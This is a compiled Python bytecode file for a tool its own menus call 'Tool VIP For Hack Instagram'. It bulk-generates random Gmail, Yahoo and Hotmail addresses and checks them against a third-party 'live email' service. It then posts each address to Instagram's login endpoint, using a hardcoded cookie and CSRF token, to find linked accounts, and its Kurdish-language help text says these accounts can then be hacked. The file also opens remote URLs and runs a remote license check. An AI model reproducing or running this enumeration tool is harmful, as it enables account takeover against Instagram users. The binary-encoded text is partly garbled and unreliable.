a
    �b2`�@  �                   @   s�   d dl mZ d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
e�d� dd� Zdaddd	d
dddddddddddddddddd�adZdd� Zd d!� Zd"d#� Zd$d%� Zd&ad'd(� Zd)ad*d+� Zd,d-� Zd.d/� Ze�  dS )0�    )�FakerNz3xdg-open https://www.instagram.com/danyar.software/c                   C   s   t �d� t �d� d S )Nz-xdg-open https://mmo69.com/_check_live_email/�clear)�os�system� r   r   �vip.py�c   s    
r   z.https://www.instagram.com/accounts/login/ajax/zwww.instagram.comZPOSTz/accounts/login/ajax/Zhttpsz*/*�gzip, deflate, br�#en-US,en;q=0.9,ar;q=0.8,en-GB;q=0.7Z277z!application/x-www-form-urlencodedz�ig_did=D9AD55FF-D40F-4569-8F3D-72923D6B496D; mid=X-oMXwAEAAFsGP-VB_KrvTNjqpMV; ig_nrcb=1; datr=lbztX-QwAT9uM6uzLDWzbgof; fbm_124024574287414=base_domain=.instagram.com; ds_user_id=45246725385; csrftoken=u27l2skXxXS3smNyYh7bYQ7GZeC39zq5zhttps://www.instagram.comz)https://www.instagram.com/accounts/login/�emptyZcorszsame-originzrMozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36Z u27l2skXxXS3smNyYh7bYQ7GZeC39zq5Z936619743392459�0Z7a3a3e64fa87ZXMLHttpRequest)Z	authority�method�pathZschemeZacceptzaccept-encodingzaccept-languagezcontent-lengthzcontent-typeZcookie�originZrefererzsec-fetch-destzsec-fetch-modezsec-fetch-sitez
user-agentzx-csrftokenzx-ig-app-idzx-ig-www-claimzx-instagram-ajaxzx-requested-withaJ  
	[1;31m
	
######                                     
#     #   ##   #    #  ####  ###### #####  
#     #  #  #  ##   # #    # #      #    # 
#     # #    # # #  # #      #####  #    # 
#     # ###### #  # # #  ### #      #####  
#     # #    # #   ## #    # #      #   #  
######  #    # #    #  ####  ###### #    # 

[1;37m

c                  C   sl   t d�} t| d��� }|D ]L}|�� }d�|�}dddddd	d
dddddd�}tj||d�j}t|� qd S )NzEMIL FILE :�rz4https://mmo69.com/_check_live_email/api.php?email={}z�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r	   r
   z
keep-alivezf_ga=GA1.2.2002912850.1612460234; _gid=GA1.2.950020214.1613080011; PHPSESSID=h18j40hdap005vbbpg644puji0z	mmo69.comZdocumentZnavigateZnonez?1�1zrMozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36)ZAcceptzAccept-EncodingzAccept-LanguageZ
ConnectionZCookieZHostzSec-Fetch-DestzSec-Fetch-ModezSec-Fetch-SitezSec-Fetch-UserzUpgrade-Insecure-Requestsz
User-Agent)�headers)	�input�open�	readlines�strip�format�requests�post�text�print)�name�filer�x�u�url�head�rer   r   r   �cheker_emil{   s(    
�r#   c                  C   s�   t �d� d} tdd�}t| � td� td� td� td� t� }td�D ]"}|�� }t|� |�|d	 � qNt�	d
� t �d� td� t�	d� d S )Nr   zC 
	
	
	hawldan bo aw shtay atawi qursa Anjamakaya Xosha (:
		
		
		zallemil.txt�wz-------------------------� z/ Lerda Ba dle xoy emil ada La dast mn w to nya ��   �
�   z+HAMW EMILAKAN SAVE BWN LA FIILE allemil.txt�   )
r   r   r   r   r   �rangeZemail�write�time�sleep)�aniZemil�fakerr   �pr   r   r   �
faker_emil�   s"    



r1   c                  C   s6  g } t �d� tdd��� }t�|�}t�|�}t�|�}d}|D ]$}t|dd� tj�	�  t
�d� qBtd� td� td� td	� td� td� td� td� td� td� t|� t|� t|� td� td� td
� td� td�}t �d� td� td� td� td� td� td� ttd��}tdd�}	tdd�}
tdd�}|dk�r�td�D ]R}d}t�|�}t�|�}t�|�}|| | | d }t|� |	�|d � �qntd� td� td� td� t
�d� |dk�r~td�D ]R}d}t�|�}t�|�}t�|�}|| | | d }t|� |
�|d � �q�td� td� td� td� t
�d� n�|dk�rtd �D ]R}d}t�|�}t�|�}t�|�}|| | | d! }t|� |�|d � �q�td� td� td� td� t
�d� n"td� td� td"� t
�d� d S )#Nr   zname.txtr   ag  [1;36m
	
	
	
	
	

 ______                 
/\  _  \          __    
\ \ \L\ \    ___ /\_\   
 \ \  __ \ /' _ `\/\ \  
  \ \ \/\ \/\ \/\ \ \ \ 
   \ \_\ \_\ \_\ \_\ \_    \/_/\/_/\/_/\/_/\/_/

	
	
	       
	       
	       
	       -------------------
	       
	       < 404.programer >
	       
	       -------------------
	       [1;37m
	       
	       
	r%   ��end�{�G�z�?�---------------------zE[1;37mTkaya Lam 3 Naway drawa Ba to Yakekyan Bnwsa La xwarawa[1;37mz------------zNawaka Bnwsa :�< 1 > gmail.com�< 2 > yahoo.com�< 3 > hotmail.com�----------------� kam emilat awi :�	gmail.txtr$   �	yahoo.txt�hotmail.txt�   r&   Z103746571010475740129837465�
@gmail.comr'   �--------------------z(Hamw emilakan save bwn la file gmail.txtr)   �   �
@yahoo.comz(Hamw emilakan save bwn la file yahoo.txt�   �@hotmail.comzTkaya Zhmara Bnwsa)r   r   r   r   �random�choicer   �sys�stdout�flushr,   r-   r   �intr*   r+   )�list�opZani1Zani2Zani3r.   r   �names�intt�gmail�yahoo�hotmail�x1�x2�x3Zwowr   r   r   �random_name_file�   s�    





















rU   c                  C   s�  t �d� t� } d}t|� td� td� td� td� td� tdd	�}td
d	�}tdd	�}ttd��}t �d� |dk�r.td�D ]|}d}| �� }|d |d  |d  |d  }t	�
|�}	t	�
|�}
t	�
|�}|	|
 | }|| d }t|� |�|d � q�t�d� t �d� td� t�d� |dk�r�td�D ]~}d}| �� }|d |d  |d  |d  }t	�
|�}	t	�
|�}
t	�
|�}|	|
 | }|| d }t|� |�|d � �q@t�d� t �d� td� t�d� |dk�r�td�D ]~}d}| �� }|d |d  |d  |d  }t	�
|�}	t	�
|�}
t	�
|�}|	|
 | }|| d }t|� |�|d � �q�t�d� t �d� td� t�d� d S )Nr   a�  
	
	[1;33m
	
                         
   _|_|              _|  
 _|    _|  _|_|_|        
 _|_|_|_|  _|    _|  _|  
 _|    _|  _|    _|  _|  
 _|    _|  _|    _|  _|  
                         
                        
                        
                         
   -- 404.programer --
    
                         
                         
                         [1;37m
                       r6   r7   r8   r%   r9   r;   r$   r<   r=   r:   r>   r&   Z10928374659430183274658r   rA   r)   r?   r'   zALL EMIL SAVE IN FILE gmail.txti�  rB   zALL EMIL SAVE IN FILE yahoo.txtrD   z!ALL EMIL SAVE IN FILE hotmail.txt)r   r   r   r   r   rJ   r   r*   r   rE   rF   r+   r,   r-   )r/   �danaZgmaillrP   ZhotmaillrN   r   �a�trR   rS   rT   �hamwir.   r   r   r   �random_name_fake�  s|    





 






 






 




rZ   z�[1;31m
       O)                  
     O) ))               O)
    O)  O))    O)) O))     
   O))   O))    O))  O))O))
  O)))))) O))   O))  O))O))
 O))       O))  O))  O))O))
O))         O))O)))  O))O))





[1;37m
c                  C   s  t �d� tdd�} tdd�}tdd�}t �d� tt� td� td�}t �d� td� td	� td
� ttd��}|dk�rtd�D ]P}d}t�	|�}t�	|�}t�	|�}	|| | |	 d }
t|
� | �
|
d � q�t�d� t �d� td� t�d� �n|dk�r�td�D ]R}d}t�	|�}t�	|�}t�	|�}	|| | |	 d }
t|
� |�
|
d � �qt�d� t �d� td� n�|dk�rtd�D ]R}d}t�	|�}t�	|�}t�	|�}	|| | |	 d }
t|
� |�
|
d � �q�t�d� t �d� td� d S )Nr   r;   r$   r=   r<   z--------------zEnter name : z < 1 > gmailz < 2 > yahooz < 3 > hotmailzKam emailt awi  : r>   �   Z0192837465018375610184659r?   r'   rA   z ALL EMIL SAVE IN FILE  gmail.txtr)   r&   rB   z ALL EMIL SAVE IN FILE  yahoo.txtrD   z"ALL EMIL SAVE IN FILE  hotmail.txt)r   r   r   r   �logor   rJ   r*   rE   rF   r+   r,   r-   )rO   rQ   rP   r   Zkamr   rR   rS   rT   Zx4rY   r   r   r   �old  sd    
























r]   aI  [1;36m
	
	
	
	
	
	
 ______                 
/\  _  \          __    
\ \ \L\ \    ___ /\_\   
 \ \  __ \ /' _ `\/\ \  
  \ \ \/\ \/\ \/\ \ \ \ 
   \ \_\ \_\ \_\ \_\ \_
   \/_/\/_/\/_/\/_/\/_/
	
	
	< Tool VIP For Hack Instagram >
	       
	       
	       
	       -------------------
	       
	       < 404.programer >
	       
	       -------------------
	       [1;37m
	       
	    
	    
	    
	    
	< ! >    Pewesta To sarata Emil bene
	dwatr fa7se kay bzane instay lasara Yan na 
wata fa7se instagram dwatr Ser krdne
Emilakan ka Instayanasara dwatr fa7se emil
	    
	       
	c            	      C   s�   t �d� d} t| � td� tdd�}td�}t|d��� }|D ]l}|�� }|dd	d
d�}tjt	t
|d�j}d|v r�td� t|d � |�|d � qBtd� t|d � qBtd� td� td� td� td� td� td� td�}d S )Nr   zG
    
    404.programer 
    
    
    
    
    Ani
    
    
   
    r@   zinstagram.txtr$   zlist email :r   z�#PWD_INSTAGRAM_BROWSER:10:1613910809:AZJQALDAleQsUwvq5s+tkCBrrlExq5b+/Gkk98iK8p26YHcVdbjMGONMoenLyrpwurfjtiLwd7T21klGL+lJO65ow22AdoYpNZjaesulmojmAzXwx7E2CqMNFUKxGiF5/a/p8M7NAfv+RcvvE8E=z{}Zfalse)ZusernameZenc_passwordZqueryParamsZoptIntoOneTap)r   �dataz"user":truer%   z >= [1;32mEMIL TRUE[1;37m r'   z >= [1;31mNOT TRUE[1;37mz8Hamw emilakan copy ka Emilakan la naw file instagram.txtz Gar copyt krd Enter ka)r   r   r   r   r   r   r   r   r   r    r!   r   r+   )	ZanZfourZfiir   r   r   r^   r"   Zahmadr   r   r   �cheker_insta�  s:    

�
r_   c                  C   s�  t �d� tD ]$} t| dd� tj��  t�d� qtd� td� td� td� td� td� td� td� td� td� td� td� td� td� td	� td� td
� td� td� td� td� td� td� td� td� td� td� t	t
d��}|dk�rFt �d� t �d� t�d� t�  |dk�r�t �d� td� t�d� t �d� td� t�d� t �d� td� t�d� |dk�r�t �d� t�  t�d� t�  |dk�r�t �d� t�  t�d� t�  |dk�r"t �d� t�  t�d� t�  |dk�rBt �d� t�  t�  |dk�rlt �d� t�  t�d� t�  |dk�r8t �d� td� td� td � td� td!� td� td"� td� td#� td� td$� td� td%� td� td� td� td� td� td� td� td&� t�d'� t�  |d(k�r�t �d� td)� td� td*� td� td+� t�d� t�  |dk�r�t �d� t�  t�  d S ),Nr   r%   r2   r4   z4 [ 0 ] Bo Henane Emil ba random be naw nusen ( VIP )z/ [ 1 ] Bo Henane name ba random bo emil ( VIP )z/ [ 2 ] Bo henane Name bo emil ba random ( VIP )z3 [ 3 ] Bo henane Emil ba shewaza Konaka ( NOT VIP )z< [ 4 ] Zanyare Dar baray bakar henane tolaka ( Information )z [ 5 ] Bo fa7s Krdn ( email ) z! [ 6 ] Bo fa7s krdn ( instagram )z [ 7 ] Zanyare Darbary mn z	 [ 8 ] TBz* [ 9 ] Ser Krdne emilakane Instayan lasaraz-----------------zKam jorat awi :�	   znano instagram.txtr(   �   z�Jyawazy 1 w 2 haya chunka la 2 da filekman haya ka 8 hazar naw zyatr la xo agryt ka law fileka Ba random nawaka dar ahene w 1 sh xoy aman yate tolaka Wata He file w sht nya w kurdesh nya Be keshaya Hichyan kurd nen harduke zooor jak kar akan�   zmAgar Har emil hack nakra awa bzana Ba report sutawa chunka emil ba report sutabe ali nya w nashtwane dayneyt �   z4Har prsyarektan habw Nama bo xom bnern 404.programerr>   rA   r   r)   �   z Information r5   z� Sery ka Bram Am toola Ba shewazyeke asan drust krawa  henane emil ba random mabastmana to emil nanusy ema halsawen ba Henane hamw jora Emilk Hamw joreke te akawi gmail mail.ru hotmail zor zyatr  Tanha To aw Shewaza Hal bzhery xoy emil ahenet bot z� shewazy 2m ema lerda filekman henawa ka 8 hazar  name la xo agry har jarek aw shewaza kay tolaka 3 nawt ayate Tosh ba dle xot nawekyan ansueytawa wata to pewest naka Meshkt helak lay lerada nawman ba random pe yawi amayan ba dle xota kam jora emila be z�Shewazy 3m zor Kon nya Balam  Ka to nazane aqlt bakar bene mn hichm la dast naya Tkaya nawi kurde manusn Dwaysh Ama psht abasty ba aqle xotan hahah gyan gyan eh ba har shewayak be abe xow name daneyy  amayan name nahane abe xow Benusy z� Bo fa7s krdne instagram abe to sarata Instagram kay wata Fa7se instagram Dwatr fa7se emil lerda am basha Hamw emilakane instayan lasar save aka La filek katek fa7s krdne Emilt leda hamw awanay insyayan lasar fa7se aka bzane kamay hack abe w kamay nabezFFa7s krdne emilsh wak wtm fa7se aka ta bzane hack abe Yaxud hack nabe z1 To 40 jrkat labar dasta Bo xwendawa zanyaryakan �(   �   zINSTAGRAM : 404.programerzFACBOOK : danyar m rostamzSNAPCHAT : vx.dana0)r   r   r.   r   rG   rH   rI   r,   r-   rJ   r   �minurZ   r1   r]   rU   r_   r   )r   Zkamyanr   r   r   rg   �  s�    


































rg   c                  C   s�   t t�� �t t�� � } d�| �}td| � zXt�d�j}||v rjtd� t t�� �}t	�
d� t�  ntd� t	�
d� t��  W n   t��  Y n0 tdkr�tt� t�  d S )N�-z[37;1mYour ID : z"https://textuploader.com/18hok/rawz![37;1mYOUR ID IS ACTIVE.........r>   z%[37;1mYOUR ID IS NOT ACTIVE.........�__main__)�strr   �geteuid�getlogin�joinr   r   �getr   r,   r-   rg   rG   �exitr   r\   �chk)Zuuid�idZhttpCaht�msgr   r   r   rp   �  s$    


rp   )r/   r   rE   r   rG   r,   r   Zjsonr"   Zbs4Zdatetimer   r   r    r!   rV   r#   r1   rU   rZ   r\   r]   r.   r_   rg   rp   r   r   r   r   �<module>   s`   
	�.-+ RZA1= \